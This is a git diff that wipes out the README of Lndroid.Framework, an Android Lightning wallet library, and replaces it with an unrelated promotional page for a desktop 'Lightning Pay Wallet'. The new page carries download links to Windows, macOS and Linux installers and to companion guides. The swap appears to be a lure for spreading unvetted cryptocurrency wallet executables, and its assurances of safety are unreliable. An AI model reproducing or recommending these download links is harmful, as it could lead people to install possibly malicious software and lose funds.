@@ -1,87 +1,91 @@
-Lndroid.Framework - build Lightning wallets on Android
-======================================================
+<p align="center"><img src="assets/banner-profile.png" alt="Lightning Pay Wallet"></p>
 
-Lndroid.Framework makes it easy to add [Lightning](https://lightning.network/) wallet into your Android app. It also allows you to expose an IPC API for other apps to interact with your wallet.
+<h1 align="center">Lightning Pay Wallet</h1>
 
-***My belief is that the future of Lightning Network is in mobile.***
+<p align="center">Start with the wallet that keeps the keys on your own machine.</p>
 
-More and more mobile apps will be integrating a Lightning wallet to make use of this incredible technilogy. More and more wallets will be created, exploring the huge tech space that Lightning enables. Lndroid.Framework is a high-level wrapper around [Lightning Network Daemon (lnd)](https://github.com/lightningnetwork/lnd), with an API that fits nicely with Android components like Jetpack LiveData or Paging. With Lndroid, building a wallet is just a matter of adding some UI. 
+<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-fed023?style=for-the-badge&labelColor=091640" alt="LICENSE"> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1"><img src="https://img.shields.io/badge/RELEASE-v1.2.1-fed023?style=for-the-badge&labelColor=091640" alt="RELEASE"></a></p>
 
-But then not every app needs a whole Lightning wallet (which is quite heavy). Some apps would prefer to access an existing wallet with an IPC API. That's why Lndroid.Framework allows wallets to expose select API methods over IPC, and provides access control management and all that. This effectively turns wallets into mobile payment platforms fully owned by end user, and should finally make "never seen before" apps like pay-per view web-browsing or pay-per-second youtube practical.
+<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
 
-Plus, Lndroid.Framework makes use of cool mobile technologies, like Keystore and Notifications, and handles various mobile restrictions like intermittent network connectivity. For instance, whenever a payment fails, it might spawn a Service to retry the payment. It might also schedule a background service to start the wallet every now and then to accept payments. This finally makes it practical to send payments between mobile wallets.
+<div align="center">
 
-To see a wallet based on Lndroid.Framework, check [Lndroid.Wallet](https://github.com/lndroid/lndroid-wallet/). To see an app integrated with the framework-based wallet, check [Lndroid.Messenger](https://github.com/lndroid/lndroid-messenger/). The client-side library for the apps is [Lndroid.Client](https://github.com/lndroid/lndroid-client/) (though it's sources are just an excerpt from the framework).
+| Platform | Requirements | File |
+| --- | --- | --- |
+| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
+| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
+| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |
 
-To see sample app+wallet in action, check [this video](https://www.youtube.com/watch?v=bF-1QxFTvHU), with description available [here](https://github.com/lndroid/lndroid-wallet/#here-is-what-you-see-on-the-lndroid-demo-video).
+</div>
 
-# Roadmap
-- [x] Multi-user access, with 'app' user role given to Apps with IPC access
-- [x] Unified API access mechanism based on message passing, allowing to implement various patterns like RPC, streaming, etc
-- [x] All API methods are plugins, which can be added/replaced/modified by wallets
-- [x] Every API method defines it's own set of access conditions/permissions, and might trigger authorization request to be confirmed by human User
-- [x] Pluggable database layer to store framework data, and to cache lnd data to serve apps faster, default - Android Room
-- [x] Pluggable codec to serialize IPC messages, default - GSON
-- [x] Pluggable key storage, which by default stores lnd wallet password encrypted by key from the keystore, allowing lnd to be started in the background when Apps connect to the API, or when background jobs are running
-- [x] All API methods are idempotent: client might generate a random 'transaction id', save it, then start an API call with it, and if it's interrupted due to client/wallet failure or termination by OS, the same call might be resumed using the transaction id
-- [x] Connected apps are identified by a random pubkey, framework generates per-user (thus per-app) keypairs and passed it's pubkeys to apps on connect
-- [x] Failed payments are retried using Foreground Service up to max-tries and payment expiry
-- [x] Scheduled job to run lnd in background every X minutes for several minutes to accept payments
-- [x] Scheduled job to run lnd in background every X hours for ~1 hour to come in sync with network and node graph
-- [x] Messages over IPC are signed using app/wallet private key, signatures verified by receiver using sender pubkey
-- [x] Authentication for internal users (role != app), at least allow passwords and also device security facilities like 'device unlocked', bio/face id, etc 
-- [ ] Authentication UI for internal users, default UI for password plus call BioPrompt when necessary
-- [ ] Lnd and framework logs recorded and exposed over API 
-- [ ] Framework and Lnd API input/output messages saved and exposed over API
-- [ ] Add common features to manage coins/channels/peers/contacts/apps
-- [ ] Notifications: add API methods to start subscriptions, so that if wallet detects that client is not connected, it sends Android Broadcast message that wakes up the client and allows it to consume the data requested by the call
-- [ ] 'Default receiver' privilege, to delegate notifications to specific apps 
-- [ ] Testnet release
+The installers above are published on [the release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1), and that page is where every file comes from.
 
-- [ ] Method/data versioning? Prepare for the future
-- [ ] Validation of every input params by every API method
-- [ ] Unit tests! Haha, we need some :)
-- [ ] Channel backups stored to local dir
+> **Installers come from this release page and nowhere else.**
 
-- [ ] Database records with long-term effects like new users or privileges are signed by author's private key, signatures verified on every use of the record, if keys are invalidated records must be re-signed. 
-- [ ] Per-user keys are stored in AndroidKeystore using proper policies, validity of keys verified by signature of the parent user up to root, root user's key signed by keys derived from wallet password, thus if any of keys are invalidated due to policies or wallet password changes, the signed permissions/users in db must be re-signed which must require User interaction with the phone.
-- [ ] Macaroons: explore if macaroons can be given in exchange for permissions, if this could help apps provide more granular security to different macaroons using KeyStore policies
-- [ ] App spending (and other) limits: granular permissions are flexible but hard to understand for Users, simple per-app limits could be enough 
-- [ ] Permissions/privileges: explore the space of various options depending on apps needs
-- [ ] Lightning protocol extensions (Whatsat, etc): explore if we need specialized API methods and permissions, like 'default protocol app'
-- [ ] Encrypted channel backup uploaded to common cloud storage services
-- [ ] Framework database is encrypted using keys derived from wallet password
+---
 
-# Contributions wanted
+## Why this page exists
 
-- [ ] LNURL support
-- [ ] WebLN support
-- [ ] NFC
-- [ ] WatchTowers
+This repository is one of the account's project pages, and its job is narrow: put the wallet download in front of you with the right file for your platform, then hand you the guides that explain what happens after the first launch. The application itself lives in the wallet repository, and every claim on this page is a claim that repository and the guides already make.
 
-Author is not an expert in lnd or crypto (or Android, for the matter), your advice and contributions will really help to bring Lndroid forward.
+A wallet is the one piece of software where the first five minutes decide everything. Install a fake build and no later step recovers it. Write the phrase down after the first payment instead of before and the mistake is already made. So this page leads with the download table and the release warning, and it points at the two guides that cover the irreversible steps rather than at a feature list.
 
-# TODO
+The wallet is a desktop application for Windows, macOS and Linux. It creates keys on your device, keeps them there, and pays over the Lightning Network without asking you to run a node. There is no account, no identity check inside the wallet and no company holding a balance that could be frozen.
 
-...This readme is just an intro, expand it to properly cover what Lndroid does, and how to use it...
+## What changes when you install it
 
-# Dependencies
+- **The phrase becomes the product.** Nothing else on your machine can reconstruct the wallet, so the first task after installation is writing twelve or twenty-four words on paper.
+- **Payments stop waiting for blocks.** A Lightning payment settles in seconds for a routing fee measured in satoshis, which changes what the wallet is useful for.
+- **The balance splits in two.** Some of it sits on-chain and some in a channel, and the difference decides what a backup can restore.
+- **Updates become a habit rather than an event.** Installing the current release over the old one keeps the wallet talking to the network it depends on.
 
-1. Android Room
-2. Protobuf
-3. AutoValue
-4. Guava
-5. Gson
-6. Lndroid.Daemon
+## Where to read next
 
-# Important
+| Guide | What it answers |
+| --- | --- |
+| [installing on Windows and macOS](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-download-windows-macos.md) | The per-platform install, the first-run choice and the two failures a fresh install hits. |
+| [seed phrase and wallet recovery](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-seed-phrase-and-wallet-recovery.md) | What a phrase restores, what needs the channel backup, and what nothing can recover. |
+| [what Lightning Pay Wallet is and whether it is safe](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-what-it-is-and-is-it-safe.md) | What the wallet does, what it deliberately leaves out, and how to tell it from the namesakes. |
 
-The whole Lndroid project is at the very early stages of development. No guarantees are made about API stability, or the like. Do not use Lndroid code on Bitcoin mainnet, as you're very likely to lose your funds.
+## What the wallet is
 
-# License
+A desktop application for Windows, macOS and Linux that creates its keys on the machine it runs on and keeps them there. It pays over the Lightning Network, holds an on-chain balance beside it, and manages the channel layer itself so the holder never opens a channel by hand. There is no account, no login and no server-side wallet, which is the whole reason the phrase matters as much as it does.
 
-MIT
+## Verifying the installer you just downloaded
 
-# Author
+Match the file name against the release listing before you run anything, then compare the SHA-256 value published on the wallet repository's README with the file on your disk. On Windows that is a PowerShell one-liner; on macOS it is `shasum -a 256` against the downloaded file. If the values differ, delete the file and download again from the release page rather than from whatever sent you the first copy.
 
-Artur Brugeman, brugeman.artur@gmail.com
+## What this page does not do
+
+It does not describe the application's internals, and it does not repeat the feature list in the wallet repository. It also does not promise anything the guides would contradict: there is no recovery service here, no support channel that can reset a wallet, and no claim that a payment can be reversed once it settles.
+
+## Where the guides go next
+
+The reading order is deliberate rather than alphabetical. Install, then custody, then the first payment, and only then the fee page: a holder who reads costs before knowing what a channel is will read the numbers as charges rather than as network behaviour. The guides repository groups the eight pages by that task order, and each page stands alone if a reader arrives from a search result instead of from the top.
+
+## A note on the account's other pages
+
+Each repository in this account carries one page like this one, and every page points at the same wallet and
+the same guides. A reader who lands on a project page by accident should be able to reach the download in one
+click and the reading order in two, which is the only job these pages were written to do.
+
+## How this page is organised
+
+This repository carries the account's project page for the wallet; the application, its releases and its issues are in the wallet repository, and the guides are in the guides repository.
+
+**No process, page or person connected to this wallet will ever ask for your recovery phrase, and any message that does is an attack.**
+
+## Support
+
+Defect reports go to the [wallet repository's issues](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/issues). Support does not contact holders first on a social platform and cannot reset a wallet.
+
+## License
+
+MIT, the same licence the wallet ships under.
+
+---
+
+<p align="center">
+<a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop">The wallet repository</a> -
+<a href="https://github.com/bitcoin-lightning-wallet/invoice-channel-guides">All guides</a>
+</p>
